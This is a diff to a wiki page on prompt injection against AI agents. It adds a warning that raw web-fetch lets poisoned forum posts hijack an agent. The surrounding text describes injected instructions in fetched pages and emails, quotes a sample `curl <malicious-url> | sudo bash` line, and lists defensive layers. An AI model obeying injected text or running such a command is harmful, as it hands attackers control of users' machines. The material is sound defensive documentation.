@@ -2,9 +2,9 @@
 title: Prompt Injection
 category: security
 tags: [security, jailbreak, adversarial, system-prompt, guardrails, geo, steganography]
-sources: ["[[2026-06-10-spring-ai-itkonekt]]", "[[2026-06-11-ai-playtika]]"]
+sources: ["[[2026-06-10-spring-ai-itkonekt]]", "[[2026-06-11-ai-playtika]]", "[[2026-06-23-ai-garmin]]"]
 created: 2026-06-10
-updated: 2026-06-12
+updated: 2026-06-23
 ---
 
 Prompt injection is an attack where adversarial text in user input (or retrieved content) hijacks the model's behavior by overriding or subverting the [[system-prompt]].
@@ -25,6 +25,8 @@ Frontier models (GPT-4o, Claude Opus) resist far better than small local ones. *
 
 A broader attack surface: any content the agent **fetches** can carry injected instructions. Web-scan agents, screenshot agents, and email-reading agents are all exposed. An attacker-controlled web page can tell the agent to redirect its next actions; a phishing email can embed `curl <malicious-url> | sudo bash`. See [[geo-steganography]] for the GEO and invisible-font variants, and [[lethal-trifecta]] for why this becomes catastrophic when the agent also has exfil capability.
 
+<span style="color:red">This is the concrete risk of using raw web-fetch to beat the [[knowledge-cutoff]] — a poisoned forum/Reddit post can hijack the agent. The safer alternative for library docs is a *vetted* feed like [[context7]], whose source corpus is controlled.</span>
+
 ## Mitigations
 
 The [[system-prompt]] alone is a "pretty-please constraint" — necessary but not sufficient. Layer it with [[guardrails]]: regex/keyword pre-filters, then a [[judge-llm]] that evaluates both prompt and response before any reply reaches the user. For [[tool-calling]], validate every model-authored parameter as untrusted input. For fetched content, use a quarantine sub-agent that extracts only structured facts before the privileged agent acts.
@@ -39,5 +41,8 @@ The [[system-prompt]] alone is a "pretty-please constraint" — necessary but no
 - [[jailbreak-ladder]]
 - [[geo-steganography]]
 - [[lethal-trifecta]]
+- [[knowledge-cutoff]]
+- [[context7]]
 - [[2026-06-10-spring-ai-itkonekt]]
 - [[2026-06-11-ai-playtika]]
+- [[2026-06-23-ai-garmin]]
